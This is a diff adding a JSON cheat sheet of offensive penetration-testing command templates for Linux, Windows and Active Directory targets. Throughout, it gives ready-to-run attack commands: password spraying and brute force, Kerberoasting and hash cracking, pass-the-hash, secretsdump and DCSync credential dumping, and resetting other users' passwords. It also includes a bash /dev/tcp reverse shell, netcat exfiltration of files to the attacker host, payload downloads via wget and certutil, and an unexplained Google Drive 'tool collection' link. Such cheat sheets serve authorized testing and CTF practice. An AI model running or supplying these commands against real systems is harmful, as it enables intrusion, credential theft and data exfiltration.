@@ -1,0 +1,580 @@
+{
+  "Enumeration": [
+    {
+      "category": "Name Resolution",
+      "commands": [
+        {
+          "title": "/etc/hosts",
+          "description": "Register a local DNS entry for the victim.",
+          "template": "echo '$VictimIP $Domain' | sudo tee -a /etc/hosts"
+        },
+        {
+          "title": "/etc/resolv.conf",
+          "description": "Register the victim as the primary DNS server.",
+          "template": "echo 'nameserver $VictimIP' | sudo tee /etc/resolv.conf"
+        },
+        {
+          "title": "DNS Lookup",
+          "description": "Resolve records from the target DNS server.",
+          "template": "dig @$VictimIP $Domain ANY +noall +answer"
+        },
+        {
+          "title": "Zone Transfer",
+          "description": "Test for an exposed DNS zone transfer.",
+          "template": "dig axfr @$VictimIP $Domain"
+        },
+        {
+          "title": "Reverse DNS Lookup",
+          "description": "Check the PTR record for the victim IP.",
+          "template": "dig -x $VictimIP @$VictimIP +short"
+        }
+      ]
+    },
+    {
+      "category": "Nmap",
+      "commands": [
+        {
+          "title": "Basic Scan",
+          "description": "A simple yet effective scan to find open ports and identify services.",
+          "template": "nmap -sCV -T4 $VictimIP"
+        },
+        {
+          "title": "All Ports Scan",
+          "description": "Scans all 65,535 TCP ports. Can be slow, but is very thorough.",
+          "template": "nmap -p- -T4 -vv $VictimIP"
+        },
+        {
+          "title": "All Ports + Output",
+          "description": "Full TCP scan with normal, grepable, and XML output.",
+          "template": "nmap -p- --min-rate 5000 -oA nmap/allports $VictimIP"
+        },
+        {
+          "title": "Targeted Service Scan",
+          "description": "Run scripts and versions against known open ports.",
+          "template": "nmap -sCV -p PORTS -oA nmap/targeted $VictimIP"
+        },
+        {
+          "title": "UDP Scan",
+          "description": "Scans for common open UDP ports.",
+          "template": "nmap -sU --top-ports 50 $VictimIP"
+        },
+        {
+          "title": "Aggressive Scan",
+          "description": "Enables OS detection, version detection, script scanning, and traceroute.",
+          "template": "nmap -A -T4 $VictimIP"
+        },
+        {
+          "title": "Vuln Scripts",
+          "description": "Run Nmap vulnerability scripts against discovered services.",
+          "template": "nmap --script vuln -p PORTS $VictimIP"
+        }
+      ]
+    },
+    {
+      "category": "SMB & NXC",
+      "commands": [
+        {
+          "title": "NXC - Enumerate SMB",
+          "description": "Basic SMB enumeration with NetExec (nxc).",
+          "template": "nxc smb $VictimIP"
+        },
+        {
+          "title": "NXC - Null Session Shares",
+          "description": "List SMB shares accessible with a null session.",
+          "template": "nxc smb $VictimIP -u '' -p '' --shares"
+        },
+        {
+          "title": "NXC - Authenticated Shares",
+          "description": "List SMB shares using provided credentials.",
+          "template": "nxc smb $VictimIP -u '$Username' -p '$Password' --shares"
+        },
+        {
+          "title": "NXC - Users",
+          "description": "Enumerate domain users with valid credentials.",
+          "template": "nxc smb $VictimIP -u '$Username' -p '$Password' --users"
+        },
+        {
+          "title": "NXC - Groups",
+          "description": "Enumerate domain groups with valid credentials.",
+          "template": "nxc smb $VictimIP -u '$Username' -p '$Password' --groups"
+        },
+        {
+          "title": "NXC - Password Policy",
+          "description": "Read the domain password policy over SMB.",
+          "template": "nxc smb $VictimIP -u '$Username' -p '$Password' --pass-pol"
+        },
+        {
+          "title": "SMBMap",
+          "description": "Enumerate SMB share permissions.",
+          "template": "smbmap -H $VictimIP -u '$Username' -p '$Password'"
+        },
+        {
+          "title": "Enum4linux-ng",
+          "description": "Run broad SMB and RPC enumeration.",
+          "template": "enum4linux-ng -A $VictimIP"
+        }
+      ]
+    },
+    {
+      "category": "Web Enumeration",
+      "commands": [
+        {
+          "title": "WhatWeb",
+          "description": "Fingerprint web technologies.",
+          "template": "whatweb http://$VictimIP:$VictimPort"
+        },
+        {
+          "title": "Nikto",
+          "description": "Check common web server misconfigurations.",
+          "template": "nikto -h http://$VictimIP:$VictimPort"
+        },
+        {
+          "title": "Gobuster Dirs",
+          "description": "Bruteforce common web paths.",
+          "template": "gobuster dir -u http://$VictimIP:$VictimPort -w $Wordlist -x php,txt,html -t 40"
+        },
+        {
+          "title": "Feroxbuster",
+          "description": "Recursive web content discovery.",
+          "template": "feroxbuster -u http://$VictimIP:$VictimPort -w $Wordlist -x php,txt,html"
+        },
+        {
+          "title": "FFUF VHost",
+          "description": "Discover virtual hosts for a domain.",
+          "template": "ffuf -u http://$VictimIP:$VictimPort -H 'Host: FUZZ.$Domain' -w $Wordlist -fs SIZE"
+        },
+        {
+          "title": "HTTP Headers",
+          "description": "Fetch response headers only.",
+          "template": "curl -i http://$VictimIP:$VictimPort"
+        },
+        {
+          "title": "Robots/Sitemap",
+          "description": "Quickly check common crawler files.",
+          "template": "curl -s http://$VictimIP:$VictimPort/robots.txt; curl -s http://$VictimIP:$VictimPort/sitemap.xml"
+        }
+      ]
+    }
+  ],
+  "Initial Access": [
+    {
+      "category": "Password Attacks",
+      "commands": [
+        {
+          "title": "Hydra SSH",
+          "description": "Test SSH credentials from user and password lists.",
+          "template": "hydra -L users.txt -P $Wordlist ssh://$VictimIP -V"
+        },
+        {
+          "title": "Hydra HTTP POST",
+          "description": "Test a web login form.",
+          "template": "hydra -L users.txt -P $Wordlist $VictimIP http-post-form '/login:username=^USER^&password=^PASS^:Invalid'"
+        },
+        {
+          "title": "NXC - Password Spray",
+          "description": "Spray a single password against a list of users.",
+          "template": "nxc smb $VictimIP -u users.txt -p '$Password' --continue-on-success"
+        },
+        {
+          "title": "Kerberoasting",
+          "description": "Request service tickets for users with SPNs to crack offline.",
+          "template": "impacket-GetUserSPNs -request -dc-ip $VictimIP $Domain/$Username"
+        },
+        {
+          "title": "AS-REP Roasting",
+          "description": "Request TGTs for users that don't require pre-authentication.",
+          "template": "impacket-GetNPUsers $Domain/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast"
+        },
+        {
+          "title": "Hashcat NTLM",
+          "description": "Crack NTLM hashes with Hashcat mode 1000.",
+          "template": "hashcat -m 1000 hashes.txt $Wordlist --force"
+        },
+        {
+          "title": "Hashcat Kerberoast",
+          "description": "Crack Kerberos TGS hashes with Hashcat mode 13100.",
+          "template": "hashcat -m 13100 hashes.kerberoast $Wordlist --force"
+        },
+        {
+          "title": "Hashcat AS-REP",
+          "description": "Crack AS-REP hashes with Hashcat mode 18200.",
+          "template": "hashcat -m 18200 hashes.asreproast $Wordlist --force"
+        }
+      ]
+    },
+    {
+      "category": "Shells",
+      "commands": [
+        {
+          "title": "Netcat Listener",
+          "description": "Start a reverse shell listener.",
+          "template": "rlwrap nc -nlvp $AttackerPort"
+        },
+        {
+          "title": "TTY Upgrade",
+          "description": "Upgrade a basic Linux shell.",
+          "template": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'; export TERM=xterm; stty rows 40 columns 120"
+        },
+        {
+          "title": "Socat Listener",
+          "description": "Catch a fully interactive Linux shell.",
+          "template": "socat file:`tty`,raw,echo=0 tcp-listen:$AttackerPort,reuseaddr"
+        },
+        {
+          "title": "Socat Victim",
+          "description": "Connect back with an interactive Linux shell.",
+          "template": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$AttackerIP:$AttackerPort"
+        }
+      ]
+    }
+  ],
+  "Post Exploit": [
+    {
+      "category": "AD Domination",
+      "commands": [
+        {
+          "title": "NXC - Pass The Hash",
+          "description": "Execute a command using a user's NTLM hash.",
+          "template": "nxc smb $VictimIP -u $Username -H 'LM_HASH:NT_HASH' -x 'whoami'"
+        },
+        {
+          "title": "NXC - Local Admin Check",
+          "description": "Check where credentials have local admin rights.",
+          "template": "nxc smb targets.txt -u '$Username' -p '$Password' --local-auth"
+        },
+        {
+          "title": "NXC - Command Exec",
+          "description": "Run a command through SMB with valid admin credentials.",
+          "template": "nxc smb $VictimIP -u '$Username' -p '$Password' -x 'whoami /all'"
+        },
+        {
+          "title": "Secrets Dump",
+          "description": "Dumps secrets from the remote machine, including LSA secrets and SAM database.",
+          "template": "impacket-secretsdump $Domain/$Username:$Password@$VictimIP"
+        },
+        {
+          "title": "DCSync",
+          "description": "Ask a Domain Controller to replicate user credential data.",
+          "template": "impacket-secretsdump -just-dc-user $Domain/$Username $Domain/$Username:$Password@$VictimIP"
+        },
+        {
+          "title": "GetADUsers",
+          "description": "List AD users and useful metadata.",
+          "template": "impacket-GetADUsers -all $Domain/$Username:$Password -dc-ip $VictimIP"
+        },
+        {
+          "title": "GetUserSPNs",
+          "description": "List Kerberoastable service accounts.",
+          "template": "impacket-GetUserSPNs $Domain/$Username:$Password -dc-ip $VictimIP"
+        }
+      ]
+    },
+    {
+      "category": "AD Account Control",
+      "commands": [
+        {
+          "title": "BloodyAD - Set Password",
+          "description": "Change another user's password when your account has ResetPassword/GenericAll rights.",
+          "template": "bloodyAD --host $VictimIP -d $Domain -u '$Username' -p '$Password' set password 'TARGET_USER' 'NewPassw0rd!'"
+        },
+        {
+          "title": "BloodyAD - Enable User",
+          "description": "Reactivate a disabled domain user when your account can write account control flags.",
+          "template": "bloodyAD --host $VictimIP -d $Domain -u '$Username' -p '$Password' remove uac 'TARGET_USER' -f ACCOUNTDISABLE"
+        },
+        {
+          "title": "PowerView - Set Password",
+          "description": "Change a controlled user's password from PowerShell.",
+          "template": "$NewCred = ConvertTo-SecureString '$Password' -AsPlainText -Force; Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $NewCred"
+        },
+        {
+          "title": "PowerView - Enable User",
+          "description": "Enable a disabled user from PowerShell.",
+          "template": "Enable-DomainAccount -Identity TARGET_USER"
+        },
+        {
+          "title": "Net RPC - Set Password",
+          "description": "Change an SMB domain user's password with valid delegated rights.",
+          "template": "net rpc password TARGET_USER 'NewPassw0rd!' -U '$Domain/$Username%$Password' -S $VictimIP"
+        },
+        {
+          "title": "Rpcclient - User Info",
+          "description": "Check target user flags before changing account state.",
+          "template": "rpcclient -U '$Domain/$Username%$Password' $VictimIP -c 'queryuser TARGET_USER'"
+        }
+      ]
+    },
+    {
+      "category": "BloodHound",
+      "commands": [
+        {
+          "title": "BloodHound Ingestor (Python)",
+          "description": "Run this on a compromised machine to collect AD data.",
+          "template": "bloodhound-python -u $Username -p '$Password' -ns $VictimIP -d $Domain -c all"
+        },
+        {
+          "title": "BloodHound Ingestor (Credentials)",
+          "description": "Run from your attack box with known credentials.",
+          "template": "bloodhound-python -u $Username -p '$Password' -d $Domain -ns $VictimIP -c all"
+        },
+        {
+          "title": "BloodHound Ingestor (PTH)",
+          "description": "Run using Pass-the-Hash.",
+          "template": "bloodhound-python -u $Username -hashes :NTHASH -d $Domain -ns $VictimIP -c all"
+        }
+      ]
+    },
+    {
+      "category": "AD Mindmap Checks",
+      "commands": [
+        {
+          "title": "ADCS Vulnerable Templates",
+          "description": "Check certificate services for vulnerable templates.",
+          "template": "certipy find -u '$Username@$Domain' -p '$Password' -dc-ip $VictimIP -vulnerable -stdout"
+        },
+        {
+          "title": "Writable ACLs",
+          "description": "Find objects the current account can modify.",
+          "template": "bloodyAD --host $VictimIP -d $Domain -u '$Username' -p '$Password' get writable"
+        },
+        {
+          "title": "Delegation Review",
+          "description": "Enumerate unconstrained, constrained, and resource-based delegation.",
+          "template": "impacket-findDelegation $Domain/$Username:'$Password' -dc-ip $VictimIP"
+        },
+        {
+          "title": "GPP Passwords",
+          "description": "Check SYSVOL for legacy Group Policy Preferences passwords.",
+          "template": "nxc smb $VictimIP -u '$Username' -p '$Password' -M gpp_password"
+        },
+        {
+          "title": "LAPS Read",
+          "description": "Try reading LAPS passwords when delegated rights exist.",
+          "template": "nxc ldap $VictimIP -u '$Username' -p '$Password' -M laps"
+        },
+        {
+          "title": "MSSQL Check",
+          "description": "Check MSSQL access and server context.",
+          "template": "nxc mssql $VictimIP -u '$Username' -p '$Password' -q 'select @@servername, system_user'"
+        }
+      ]
+    },
+    {
+      "category": "Linux PrivEsc",
+      "commands": [
+        {
+          "title": "LinPEAS",
+          "description": "Run the LinPEAS script to automatically find privilege escalation vectors.",
+          "template": "wget http://$AttackerIP:$AttackerPort/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh"
+        },
+        {
+          "title": "Check Sudo",
+          "description": "Check what commands the current user can run as root.",
+          "template": "sudo -l"
+        },
+        {
+          "title": "Writable Paths",
+          "description": "Find writable directories outside noisy virtual filesystems.",
+          "template": "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'"
+        },
+        {
+          "title": "Find SUID Binaries",
+          "description": "Find files with the SUID bit set, which may be exploitable.",
+          "template": "find / -perm -u=s -type f 2>/dev/null"
+        },
+        {
+          "title": "Find Capabilities",
+          "description": "Find binaries with special capabilities that can be abused.",
+          "template": "getcap -r / 2>/dev/null"
+        },
+        {
+          "title": "List Cron Jobs",
+          "description": "Check for scheduled tasks that might be misconfigured.",
+          "template": "cat /etc/crontab; ls -la /etc/cron.*"
+        },
+        {
+          "title": "Interesting Files",
+          "description": "Search for common secrets in readable files.",
+          "template": "grep -RilE 'password|passwd|secret|token|api[_-]?key' /home /var/www 2>/dev/null"
+        },
+        {
+          "title": "Sudo Version",
+          "description": "Check sudo version when sudo rules look interesting.",
+          "template": "sudo -V | head -n 5"
+        },
+        {
+          "title": "Writable Service Files",
+          "description": "Find writable systemd unit files.",
+          "template": "find /etc/systemd /lib/systemd -type f -writable 2>/dev/null"
+        },
+        {
+          "title": "Writable PATH Hijack",
+          "description": "Check PATH directories that the current user can write to.",
+          "template": "echo $PATH | tr ':' '\\n' | while read d; do [ -w \"$d\" ] && echo \"$d\"; done"
+        },
+        {
+          "title": "NFS Exports",
+          "description": "Check local NFS export configuration.",
+          "template": "cat /etc/exports 2>/dev/null; showmount -e $VictimIP 2>/dev/null"
+        },
+        {
+          "title": "pspy64",
+          "description": "Monitor processes to find cron jobs or other automated scripts.",
+          "template": "./pspy64 -pf -i 1000"
+        }
+      ]
+    },
+    {
+      "category": "Windows PrivEsc",
+      "commands": [
+        {
+          "title": "User Context",
+          "description": "Show current user, groups, and privileges.",
+          "template": "whoami /all"
+        },
+        {
+          "title": "System Info",
+          "description": "Collect Windows version and patch context.",
+          "template": "systeminfo"
+        },
+        {
+          "title": "Services",
+          "description": "List services with binary paths.",
+          "template": "wmic service get name,displayname,pathname,startmode"
+        },
+        {
+          "title": "AlwaysInstallElevated",
+          "description": "Check MSI install elevation policy.",
+          "template": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+        },
+        {
+          "title": "Saved Credentials",
+          "description": "List saved Windows credentials.",
+          "template": "cmdkey /list"
+        },
+        {
+          "title": "Unquoted Service Paths",
+          "description": "Find services with unquoted paths and spaces.",
+          "template": "wmic service get name,pathname,startmode | findstr /i \"Auto\" | findstr /i /v \"C:\\\\Windows\\\\\" | findstr /i /v '\"'"
+        },
+        {
+          "title": "Writable Service Config",
+          "description": "Check whether a service can be reconfigured.",
+          "template": "accesschk.exe /accepteula -uwcqv \"$Username\" *"
+        },
+        {
+          "title": "Stored Registry Secrets",
+          "description": "Search common registry locations for stored credentials.",
+          "template": "reg query HKLM /f password /t REG_SZ /s 2>nul & reg query HKCU /f password /t REG_SZ /s 2>nul"
+        },
+        {
+          "title": "PowerUp",
+          "description": "Run common Windows privilege escalation checks.",
+          "template": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\""
+        }
+      ]
+    },
+    {
+      "category": "Tunneling",
+      "commands": [
+        {
+          "title": "Chisel Server",
+          "description": "Start a reverse SOCKS server on the attacker box.",
+          "template": "chisel server -p $AttackerPort --reverse"
+        },
+        {
+          "title": "Chisel Client",
+          "description": "Create a reverse SOCKS tunnel from the target.",
+          "template": "chisel client $AttackerIP:$AttackerPort R:socks"
+        },
+        {
+          "title": "SSH Dynamic SOCKS",
+          "description": "Create a local SOCKS proxy over SSH.",
+          "template": "ssh -N -D 127.0.0.1:1080 $Username@$VictimIP"
+        },
+        {
+          "title": "Proxychains Test",
+          "description": "Verify traffic through the configured proxy.",
+          "template": "proxychains -q curl http://$VictimIP:$VictimPort"
+        }
+      ]
+    }
+  ],
+  "Useful Commands": [
+    {
+      "category": "General Utilities",
+      "commands": [
+        {
+          "title": "My Tool Collection",
+          "description": "Just my own Tool Collection. Might update once in a while",
+          "template": "https://drive.usercontent.google.com/download?id=1T00NujmQEiW42V7LBa7Sfo7jwemeBztK&export=download&authuser=0"
+        },
+        {
+          "title": "Reverse Shell Listener",
+          "description": "Sets up a listener to catch an incoming reverse shell.",
+          "template": "rlwrap nc -nlvp $AttackerPort"
+        },
+        {
+          "title": "Bash Reverse Shell",
+          "description": "Execute on a Linux victim to send a shell back.",
+          "template": "bash -c 'bash -i >& /dev/tcp/$AttackerIP/$AttackerPort 0>&1'"
+        },
+        {
+          "title": "Python HTTP Server",
+          "description": "A simple way to serve files from your current directory.",
+          "template": "python3 -m http.server $AttackerPort"
+        },
+        {
+          "title": "Download File (Linux)",
+          "description": "Download a file from your attacker machine to the victim.",
+          "template": "wget http://$AttackerIP:$AttackerPort/file"
+        },
+        {
+          "title": "Download File (Windows CMD)",
+          "description": "Download a file to a Windows victim via cmd.",
+          "template": "certutil.exe -urlcache -f http://$AttackerIP:$AttackerPort/file file.exe"
+        },
+        {
+          "title": "Download File (Windows PS)",
+          "description": "Download a file to a Windows victim via PowerShell.",
+          "template": "iwr -uri http://$AttackerIP:$AttackerPort/file -outfile file.exe"
+        },
+        {
+          "title": "Upload from Victim (Attacker)",
+          "description": "Create a listener on the attacker machine.",
+          "template": "nc -l -p $AttackerPort -q 1 > file.zip < /dev/null"
+        },
+        {
+          "title": "Upload from Victim (Victim)",
+          "description": "Upload data from the victim machine with netcat.",
+          "template": "cat file.zip | netcat $AttackerIP $AttackerPort"
+        },
+        {
+          "title": "Base64 Encode",
+          "description": "Encode a file for clipboard-safe transfer.",
+          "template": "base64 -w0 file.bin"
+        },
+        {
+          "title": "Base64 Decode",
+          "description": "Decode a base64 blob back to a file.",
+          "template": "echo 'BASE64_DATA' | base64 -d > file.bin"
+        },
+        {
+          "title": "Search (Linux)",
+          "description": "Find text files under the current user's home.",
+          "template": "find ~ -name '*.txt'"
+        },
+        {
+          "title": "Search (Windows CMD)",
+          "description": "Find text files on Windows.",
+          "template": "dir *.txt /s /b"
+        },
+        {
+          "title": "Python PTY Size",
+          "description": "Set terminal rows and columns after shell upgrade.",
+          "template": "stty rows 40 columns 120"
+        }
+      ]
+    }
+  ]
+}
